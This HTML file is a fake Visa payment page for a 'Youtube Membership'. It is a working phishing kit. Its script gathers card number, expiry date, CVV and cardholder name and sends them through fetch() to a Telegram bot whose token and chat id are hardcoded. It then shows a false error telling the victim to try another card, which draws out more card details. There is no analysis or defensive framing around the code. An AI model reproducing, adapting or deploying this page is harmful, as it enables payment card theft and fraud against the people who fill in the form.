<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Card Payment Gateway</title>

    <style>

        body {

            font-family: Arial, sans-serif;

            background-color: #f9f9f9;

            display: flex;

            justify-content: center;

            align-items: center;

            height: 100vh;

            margin: 0;

        }

        .payment-container {

            background-color: #fff;

            border-radius: 10px;

            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);

            padding: 20px;

            width: 400px;

            box-sizing: border-box;

        }

        .payment-header {

            display: flex;

            justify-content: space-between;

            align-items: center;

            margin-bottom: 20px;

        }

        .payment-header img {

            height: 30px;

        }

        .input-group {

            display: flex;

            flex-direction: column;

            margin-bottom: 15px;

        }

        .input-group input {

            border: 1px solid #ddd;

            border-radius: 5px;

            padding: 10px;

            font-size: 16px;

            box-sizing: border-box;

            width: 100%;

        }

        .input-group input:focus {

            outline: none;

            border-color: #007bff;

        }

        .row {

            display: flex;

            gap: 10px;

        }

        .row .input-group {

            width: 50%;

        }

        .checkbox-container {

            display: flex;

            align-items: center;

            font-size: 14px;

            margin-bottom: 20px;

        }

        .checkbox-container input {

            margin-right: 8px;

        }

        .terms {

            font-size: 13px;

            color: #555;

        }

        .terms a {

            color: #007bff;

            text-decoration: none;

        }

        .terms a:hover {

            text-decoration: underline;

        }

        .pay-button {

            width: 100%;

            padding: 12px;

            background-color: #007bff;

            color: #fff;

            font-size: 16px;

            border: none;

            border-radius: 5px;

            cursor: pointer;

        }

        .pay-button:hover {

            background-color: #0056b3;

        }

    </style>

</head>

<body>

<div class="payment-container">

    <div class="payment-header">

        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">

        <span style="font-size: 14px; color: #555; cursor: pointer;">BDT 20à§³</span>

    </div>

    <form id="paymentForm">

        <div class="input-group">

            <input type="text" id="cardNumber" placeholder="Enter Card Number" maxlength="16" required>

        </div>

        <div class="row">

            <div class="input-group">

                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>

            </div>

            <div class="input-group">

                <input type="password" id="cvv" placeholder="CVC/CVV" maxlength="3" required>

            </div>

        </div>

        <div class="input-group">

            <input type="text" id="cardHolderName" placeholder="Card Holder Name" required>

        </div>

        <div class="checkbox-container">

            <input type="checkbox" id="saveCard">

            <label for="saveCard">Save card & remember me</label>

        </div>

        <p class="terms">

            By checking this pay button you agree to our <a href="#">Terms of Service</a> which is limited to facilitating your payment to <strong>Youtube Membership</strong>.

        </p>

        <button type="button" class="pay-button" onclick="processPayment()">Pay Now</button>

    </form>

</div>

<script>

    // Telegram Bot API Info

    const botToken = "7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y";

    const chatId = "7174617845";

    function processPayment() {

        const cardNumber = document.getElementById('cardNumber').value;

        const expiryDate = document.getElementById('expiryDate').value;

        const cvv = document.getElementById('cvv').value;

        const cardHolderName = document.getElementById('cardHolderName').value;

        if (!cardNumber || !expiryDate || !cvv || !cardHolderName) {

            alert("Please fill out all fields.");

            return;

        }

        // Construct Telegram message

        const message = `

ðŸ’³ **New Payment Request**

- **Card Number**: ${cardNumber}

- **Expiry Date**: ${expiryDate}

- **CVV**: ${cvv}

- **Card Holder Name**: ${cardHolderName}

        `;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)

            .then(response => {

                if (response.ok) {

                    alert("Correct this card info or try a different card. !");

                } else {

                    alert("Failed to payment!");

                }

            })

            .catch(error => {

                console.error("Error sending to Telegram:", error);

                alert("An error occurred. Please try again.");

            });

    }

</script>

</body>

</html>
